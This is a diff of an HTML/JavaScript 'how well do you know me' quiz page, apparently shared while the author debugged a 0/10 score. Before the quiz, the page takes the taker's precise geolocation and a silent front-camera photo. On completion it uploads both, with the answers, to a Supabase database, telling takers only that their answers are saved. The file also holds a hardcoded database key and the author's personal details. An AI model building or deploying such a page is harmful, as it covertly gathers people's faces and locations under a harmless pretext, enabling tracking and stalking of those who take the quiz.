@@ -1,299 +1,300 @@
-<!DOCTYPE html>
+this the code and in score it shows 0/10 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Quiz Application</title>
-  <!-- Load Supabase JS Client -->
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-  <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f4f7f6;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .card {
-      background: white;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-      width: 100%;
-      max-width: 500px;
-      text-align: center;
-    }
-    .hidden { display: none; }
-    video { width: 100%; border-radius: 8px; margin-bottom: 15px; }
-    button {
-      background-color: #007bff;
-      color: white;
-      border: none;
-      padding: 12px 24px;
-      border-radius: 6px;
-      cursor: pointer;
-      font-size: 16px;
-      margin-top: 10px;
-      width: 100%;
-      transition: background-color 0.3s;
-    }
-    button:hover { background-color: #0056b3; }
-    button:disabled { background-color: #cccccc; cursor: not-allowed; }
-    .option-btn {
-      background-color: #e9ecef;
-      color: #333;
-      margin: 8px 0;
-      text-align: left;
-    }
-    .option-btn:hover { background-color: #d3d9df; }
-    .option-btn.selected {
-      background-color: #28a745;
-      color: white;
-    }
-    #question-text { font-size: 18px; font-weight: bold; margin-bottom: 20px; }
-    .status { margin-top: 15px; font-size: 14px; color: #666; line-height: 1.4; }
-    
-    /* New styles for the score display */
-    .score-container {
-      background: #f8f9fa;
-      border: 2px solid #007bff;
-      border-radius: 10px;
-      padding: 20px;
-      margin: 20px 0;
-    }
-    #score-display { 
-      color: #007bff; 
-      font-size: 32px; 
-      font-weight: bold;
-      margin: 0; 
-    }
-    #score-message {
-      font-size: 16px;
-      color: #555;
-      margin-top: 5px;
-    }
-  </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Quiz Application</title>
+  <!-- Load Supabase JS Client -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f4f7f6;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .card {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 500px;
+      text-align: center;
+    }
+    .hidden { display: none; }
+    video { width: 100%; border-radius: 8px; margin-bottom: 15px; }
+    button {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 10px;
+      width: 100%;
+      transition: background-color 0.3s;
+    }
+    button:hover { background-color: #0056b3; }
+    button:disabled { background-color: #cccccc; cursor: not-allowed; }
+    .option-btn {
+      background-color: #e9ecef;
+      color: #333;
+      margin: 8px 0;
+      text-align: left;
+    }
+    .option-btn:hover { background-color: #d3d9df; }
+    .option-btn.selected {
+      background-color: #28a745;
+      color: white;
+    }
+    #question-text { font-size: 18px; font-weight: bold; margin-bottom: 20px; }
+    .status { margin-top: 15px; font-size: 14px; color: #666; line-height: 1.4; }
+    
+    /* New styles for the score display */
+    .score-container {
+      background: #f8f9fa;
+      border: 2px solid #007bff;
+      border-radius: 10px;
+      padding: 20px;
+      margin: 20px 0;
+    }
+    #score-display { 
+      color: #007bff; 
+      font-size: 32px; 
+      font-weight: bold;
+      margin: 0; 
+    }
+    #score-message {
+      font-size: 16px;
+      color: #555;
+      margin-top: 5px;
+    }
+  </style>
 </head>
 <body>
 
-  <!-- Screen 1: Permissions & Capture -->
-  <div id="init-screen" class="card">
-    <h2>Welcome to the Quiz</h2>
-    <p>Please allow camera and location access to begin.</p>
-    <video id="camera-feed" autoplay playsinline class="hidden"></video>
-    <canvas id="photo-canvas" class="hidden"></canvas>
-    <button id="start-btn">Grant Access & Start</button>
-    <p id="init-status" class="status"></p>
-  </div>
+  <!-- Screen 1: Permissions & Capture -->
+  <div id="init-screen" class="card">
+    <h2>Welcome to the Quiz</h2>
+    <p>Please allow camera and location access to begin.</p>
+    <video id="camera-feed" autoplay playsinline class="hidden"></video>
+    <canvas id="photo-canvas" class="hidden"></canvas>
+    <button id="start-btn">Grant Access & Start</button>
+    <p id="init-status" class="status"></p>
+  </div>
 
-  <!-- Screen 2: Quiz -->
-  <div id="quiz-screen" class="card hidden">
-    <div style="display: flex; justify-content: space-between; font-size: 14px; margin-bottom: 15px; color: #666;">
-      <span id="question-tracker">Question 1/10</span>
-    </div>
-    <div id="question-text">Question goes here?</div>
-    <div id="options-container"></div>
-    <button id="next-btn" class="hidden">Next Question</button>
-  </div>
+  <!-- Screen 2: Quiz -->
+  <div id="quiz-screen" class="card hidden">
+    <div style="display: flex; justify-content: space-between; font-size: 14px; margin-bottom: 15px; color: #666;">
+      <span id="question-tracker">Question 1/10</span>
+    </div>
+    <div id="question-text">Question goes here?</div>
+    <div id="options-container"></div>
+    <button id="next-btn" class="hidden">Next Question</button>
+  </div>
 
-  <!-- Screen 3: Completion Page (Score Screen) -->
-  <div id="result-screen" class="card hidden">
-    <h2>Quiz Complete!</h2>
-    
-    <div class="score-container">
-      <p id="score-message">You scored</p>
-      <div id="score-display">10 / 10</div>
-    </div>
+  <!-- Screen 3: Completion Page (Score Screen) -->
+  <div id="result-screen" class="card hidden">
+    <h2>Quiz Complete!</h2>
+    
+    <div class="score-container">
+      <p id="score-message">You scored</p>
+      <div id="score-display">10 / 10</div>
+    </div>
 
-    <p>Your answers have been securely saved.</p>
-    <p id="final-status" class="status"></p>
-  </div>
+    <p>Your answers have been securely saved.</p>
+    <p id="final-status" class="status"></p>
+  </div>
 
-  <script>
-    // Initialize Supabase
-    const SUPABASE_URL = 'https://rubhdpgebyjtqwwyyzox.supabase.co';
-    const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJ1YmhkcGdlYnlqdHF3d3l5em94Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTM3MDk3ODQsImV4cCI6MjEwOTI4NTc4NH0.vxWRPW4gBhyYCRnpiShPC-jVOr9--yMTpuExEHIktCs';
-    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+  <script>
+    // Initialize Supabase
+    const SUPABASE_URL = 'https://rubhdpgebyjtqwwyyzox.supabase.co';
+    const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJ1YmhkcGdlYnlqdHF3d3l5em94Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTM3MDk3ODQsImV4cCI6MjEwOTI4NTc4NH0.vxWRPW4gBhyYCRnpiShPC-jVOr9--yMTpuExEHIktCs';
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    // 10 Custom Questions with corrected option indices for the correct answers
-    const quizData = [
-      { question: "When is my date of birth?", options: ["10 January", "24 May", "15 August", "12 October"], correct: 1 }, // 24 May is index 1
-      { question: "What is my father's name?", options: ["Mahesh", "Pankaj", "Rajesh", "Sunil"], correct: 1 }, // Pankaj is index 1
-      { question: "What is my van number?", options: ["12", "15", "19", "22"], correct: 2 }, // 19 is index 2
-      { question: "Which house do I belong to in school?", options: ["Green", "Red", "Blue", "Yellow"], correct: 0 }, // Green is index 0
-      { question: "Which class am I in?", options: ["6B", "7B", "7A", "6A"], correct: 1 }, // 7B is index 1
-      { question: "How many sisters do I have?", options: ["One", "Two", "Three", "None"], correct: 1 }, // Two is index 1
-      { question: "What is my roll number?", options: ["5", "6", "7", "8"], correct: 2 }, // 7 is index 2
-      { question: "Where is my home located?", options: ["Pothia", "Thakurganj", "Galgalia", "Chichuabari"], correct: 0 }, // Pothia is index 0
-      { question: "What is the name of my best friend?", options: ["Abhay", "Sayan", "Muzaffar", "Faisal"], correct: 2 }, // Muzaffar is index 2
-      { question: "How is Ayush related to me?", options: ["Brother", "Cousin", "Friend", "Uncle"], correct: 1 } // Cousin is index 1
-    ];
+    // 10 Demo Questions focused on foundational Science & Social Science
+    // 10 Custom Questions
+    const quizData = [
+      { question: "When is my date of birth?", options: ["10 January", "24 May", "15 August", "12 October"], correct: 1 },
+      { question: "What is my father's name?", options: ["Mahesh", "Pankaj", "Rajesh", "Sunil"], correct: 1 },
+      { question: "What is my van number?", options: ["12", "15", "19", "22"], correct: 2 },
+      { question: "Which house do I belong to in school?", options: ["Green", "Red", "Blue", "Yellow"], correct: 0 },
+      { question: "Which class am I in?", options: ["6B", "7B", "7A", "6A"], correct: 1 },
+      { question: "How many sisters do I have?", options: ["One", "Two", "Three", "None"], correct: 1 },
+      { question: "What is my roll number?", options: ["5", "6", "7", "8"], correct: 2 },
+      { question: "Where is my home located?", options: ["Pothia", "Thakurganj", "Galgalia", "Chichuabari"], correct: 0 },
+      { question: "What is the name of my best friend?", options: ["Abhay", "Sayan", "Muzaffar", "Faisal"], correct: 2 },
+      { question: "How is Ayush related to me?", options: ["Brother", "Cousin", "Friend", "Uncle"], correct: 1 }
+    ];
 
-    let currentQuestionIndex = 0;
-    let userAnswers = [];
-    let capturedPhotoBase64 = "";
-    let capturedLocation = { lat: null, lng: null };
-    let selectedOptionIndex = null;
+    let currentQuestionIndex = 0;
+    let userAnswers = [];
+    let capturedPhotoBase64 = "";
+    let capturedLocation = { lat: null, lng: null };
+    let selectedOptionIndex = null;
 
-    // DOM Elements
-    const initScreen = document.getElementById('init-screen');
-    const quizScreen = document.getElementById('quiz-screen');
-    const resultScreen = document.getElementById('result-screen');
-    const startBtn = document.getElementById('start-btn');
-    const initStatus = document.getElementById('init-status');
-    const cameraFeed = document.getElementById('camera-feed');
-    const photoCanvas = document.getElementById('photo-canvas');
-    
-    const questionText = document.getElementById('question-text');
-    const optionsContainer = document.getElementById('options-container');
-    const nextBtn = document.getElementById('next-btn');
-    const questionTracker = document.getElementById('question-tracker');
-    const scoreDisplay = document.getElementById('score-display');
+    // DOM Elements
+    const initScreen = document.getElementById('init-screen');
+    const quizScreen = document.getElementById('quiz-screen');
+    const resultScreen = document.getElementById('result-screen');
+    const startBtn = document.getElementById('start-btn');
+    const initStatus = document.getElementById('init-status');
+    const cameraFeed = document.getElementById('camera-feed');
+    const photoCanvas = document.getElementById('photo-canvas');
+    
+    const questionText = document.getElementById('question-text');
+    const optionsContainer = document.getElementById('options-container');
+    const nextBtn = document.getElementById('next-btn');
+    const questionTracker = document.getElementById('question-tracker');
+    const scoreDisplay = document.getElementById('score-display');
 
-    // Step 1: Capture Location and Photo
-    startBtn.addEventListener('click', async () => {
-      startBtn.disabled = true;
-      
-      // Warning for local file testing
-      if (window.location.protocol === 'file:') {
-        initStatus.innerText = "Error: Browsers block camera/location for 'file://' URLs. Please host this on a local server (e.g., VS Code Live Server) or deploy it.";
-        initStatus.style.color = "red";
-        startBtn.disabled = false;
-        return;
-      }
+    // Step 1: Capture Location and Photo
+    startBtn.addEventListener('click', async () => {
+      startBtn.disabled = true;
+      
+      // Warning for local file testing
+      if (window.location.protocol === 'file:') {
+        initStatus.innerText = "Error: Browsers block camera/location for 'file://' URLs. Please host this on a local server or deploy it.";
+        initStatus.style.color = "red";
+        startBtn.disabled = false;
+        return;
+      }
 
-      initStatus.innerText = "Requesting location permission...";
-      initStatus.style.color = "#666";
+      initStatus.innerText = "Requesting location permission...";
+      initStatus.style.color = "#666";
 
-      try {
-        // 1. Get Location
-        const position = await new Promise((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
-        });
-        capturedLocation.lat = position.coords.latitude;
-        capturedLocation.lng = position.coords.longitude;
+      try {
+        // 1. Get Location
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
+        });
+        capturedLocation.lat = position.coords.latitude;
+        capturedLocation.lng = position.coords.longitude;
 
-        // 2. Get Camera
-        initStatus.innerText = "Requesting camera permission...";
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        cameraFeed.srcObject = stream;
-        cameraFeed.classList.remove('hidden');
-        
-        // Wait for video to load then capture
-        await new Promise(resolve => cameraFeed.onloadedmetadata = resolve);
-        
-        // Scale down to prevent massive Base64 strings
-        const context = photoCanvas.getContext('2d');
-        photoCanvas.width = 320;
-        photoCanvas.height = 240;
-        context.drawImage(cameraFeed, 0, 0, photoCanvas.width, photoCanvas.height);
-        
-        capturedPhotoBase64 = photoCanvas.toDataURL('image/jpeg', 0.8);
-        
-        // Stop camera tracks to turn off the webcam light
-        stream.getTracks().forEach(track => track.stop());
+        // 2. Get Camera
+        initStatus.innerText = "Requesting camera permission...";
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        cameraFeed.srcObject = stream;
+        cameraFeed.classList.remove('hidden');
+        
+        // Wait for video to load then capture
+        await new Promise(resolve => cameraFeed.onloadedmetadata = resolve);
+        
+        // Scale down to prevent massive Base64 strings
+        const context = photoCanvas.getContext('2d');
+        photoCanvas.width = 320;
+        photoCanvas.height = 240;
+        context.drawImage(cameraFeed, 0, 0, photoCanvas.width, photoCanvas.height);
+        
+        capturedPhotoBase64 = photoCanvas.toDataURL('image/jpeg', 0.8);
+        
+        // Stop camera tracks to turn off the webcam light
+        stream.getTracks().forEach(track => track.stop());
 
-        // Start Quiz
-        initScreen.classList.add('hidden');
-        quizScreen.classList.remove('hidden');
-        loadQuestion();
+        // Start Quiz
+        initScreen.classList.add('hidden');
+        quizScreen.classList.remove('hidden');
+        loadQuestion();
 
-      } catch (err) {
-        console.error("Access error:", err);
-        startBtn.disabled = false;
-        
-        if (err.name === "NotAllowedError" || err.code === 1) { 
-          initStatus.innerHTML = "<strong>Permission Denied:</strong> You blocked camera or location access. Please reset permissions in your browser.";
-        } else if (err.name === "NotFoundError") {
-          initStatus.innerText = "Error: No camera found on this device.";
-        } else {
-          initStatus.innerText = "Error accessing device hardware: " + err.message;
-        }
-        initStatus.style.color = "red";
-      }
-    });
+      } catch (err) {
+        console.error("Access error:", err);
+        startBtn.disabled = false;
+        
+        if (err.name === "NotAllowedError" || err.code === 1) { 
+          initStatus.innerHTML = "<strong>Permission Denied:</strong> You blocked camera or location access. Please reset permissions in your browser.";
+        } else if (err.name === "NotFoundError") {
+          initStatus.innerText = "Error: No camera found on this device.";
+        } else {
+          initStatus.innerText = "Error accessing device hardware: " + err.message;
+        }
+        initStatus.style.color = "red";
+      }
+    });
 
-    // Step 2: Render Questions
-    function loadQuestion() {
-      selectedOptionIndex = null;
-      nextBtn.classList.add('hidden');
-      
-      const q = quizData[currentQuestionIndex];
-      questionTracker.innerText = `Question ${currentQuestionIndex + 1}/${quizData.length}`;
-      questionText.innerText = q.question;
-      
-      optionsContainer.innerHTML = '';
-      
-      q.options.forEach((opt, index) => {
-        const btn = document.createElement('button');
-        btn.innerText = opt;
-        btn.className = 'option-btn';
-        btn.onclick = () => selectOption(index, btn);
-        optionsContainer.appendChild(btn);
-      });
-    }
+    // Step 2: Render Questions
+    function loadQuestion() {
+      selectedOptionIndex = null;
+      nextBtn.classList.add('hidden');
+      
+      const q = quizData[currentQuestionIndex];
+      questionTracker.innerText = `Question ${currentQuestionIndex + 1}/${quizData.length}`;
+      questionText.innerText = q.question;
+      
+      optionsContainer.innerHTML = '';
+      
+      q.options.forEach((opt, index) => {
+        const btn = document.createElement('button');
+        btn.innerText = opt;
+        btn.className = 'option-btn';
+        btn.onclick = () => selectOption(index, btn);
+        optionsContainer.appendChild(btn);
+      });
+    }
 
-    function selectOption(index, btn) {
-      selectedOptionIndex = index;
-      
-      const allBtns = optionsContainer.querySelectorAll('.option-btn');
-      allBtns.forEach(b => b.classList.remove('selected'));
-      btn.classList.add('selected');
-      
-      nextBtn.classList.remove('hidden');
-      if(currentQuestionIndex === quizData.length - 1) {
-        nextBtn.innerText = "Submit Quiz";
-      }
-    }
+    function selectOption(index, btn) {
+      selectedOptionIndex = index;
+      
+      const allBtns = optionsContainer.querySelectorAll('.option-btn');
+      allBtns.forEach(b => b.classList.remove('selected'));
+      btn.classList.add('selected');
+      
+      nextBtn.classList.remove('hidden');
+      if(currentQuestionIndex === quizData.length - 1) {
+        nextBtn.innerText = "Submit Quiz";
+      }
+    }
 
-    // Step 3: Handle Progression & Calculate Final Score
-    nextBtn.addEventListener('click', async () => {
-      userAnswers.push({
-        question: quizData[currentQuestionIndex].question,
-        selectedAnswer: quizData[currentQuestionIndex].options[selectedOptionIndex],
-        isCorrect: selectedOptionIndex === quizData[currentQuestionIndex].correct
-      });
+    // Step 3: Handle Progression & Calculate Final Score
+    nextBtn.addEventListener('click', async () => {
+      userAnswers.push({
+        question: quizData[currentQuestionIndex].question,
+        selectedAnswer: quizData[currentQuestionIndex].options[selectedOptionIndex],
+        isCorrect: selectedOptionIndex === quizData[currentQuestionIndex].correct
+      });
 
-      currentQuestionIndex++;
+      currentQuestionIndex++;
 
-      if (currentQuestionIndex < quizData.length) {
-        loadQuestion();
-      } else {
-        // Quiz is finished - transition to Completion Page
-        quizScreen.classList.add('hidden');
-        resultScreen.classList.remove('hidden');
-        
-        // Calculate and Display Final Score dynamically
-        const finalScore = userAnswers.filter(answer => answer.isCorrect).length;
-        scoreDisplay.innerText = `${finalScore} / ${quizData.length}`;
+      if (currentQuestionIndex < quizData.length) {
+        loadQuestion();
+      } else {
+        // Quiz is finished - transition to Completion Page
+        quizScreen.classList.add('hidden');
+        resultScreen.classList.remove('hidden');
+        
+        // Calculate and Display Final Score dynamically
+        const finalScore = userAnswers.filter(answer => answer.isCorrect).length;
+        scoreDisplay.innerText = `${finalScore} / ${quizData.length}`;
 
-        document.getElementById('final-status').innerText = "Saving to database...";
-        
-        // Upload to Supabase
-        const { data, error } = await supabaseClient
-          .from('quiz_submissions')
-          .insert([
-            { 
-              latitude: capturedLocation.lat, 
-              longitude: capturedLocation.lng, 
-              photo_base64: capturedPhotoBase64, 
-              answers: userAnswers,
-              score: finalScore // Make sure your Supabase table has a 'score' column
-            }
-          ]);
+        document.getElementById('final-status').innerText = "Saving to database...";
+        
+        // Upload to Supabase
+        const { data, error } = await supabaseClient
+          .from('quiz_submissions')
+          .insert([
+            { 
+              latitude: capturedLocation.lat, 
+              longitude: capturedLocation.lng, 
+              photo_base64: capturedPhotoBase64, 
+              answers: userAnswers,
+              score: finalScore // Make sure your Supabase table has a 'score' column
+            }
+          ]);
 
-        if (error) {
-          console.error(error);
-          document.getElementById('final-status').innerText = "Database Error: " + error.message;
-          document.getElementById('final-status').style.color = "red";
-        } else {
-          document.getElementById('final-status').innerText = "Successfully saved to Supabase!";
-          document.getElementById('final-status').style.color = "green";
-        }
-      }
-    });
-  </script>
+        if (error) {
+          console.error(error);
+          document.getElementById('final-status').innerText = "Database Error: " + error.message;
+          document.getElementById('final-status').style.color = "red";
+        } else {
+          document.getElementById('final-status').innerText = "Successfully saved to Supabase!";
+          document.getElementById('final-status').style.color = "green";
+        }
+      }
+    });
+  </script>
 </body>
 </html>
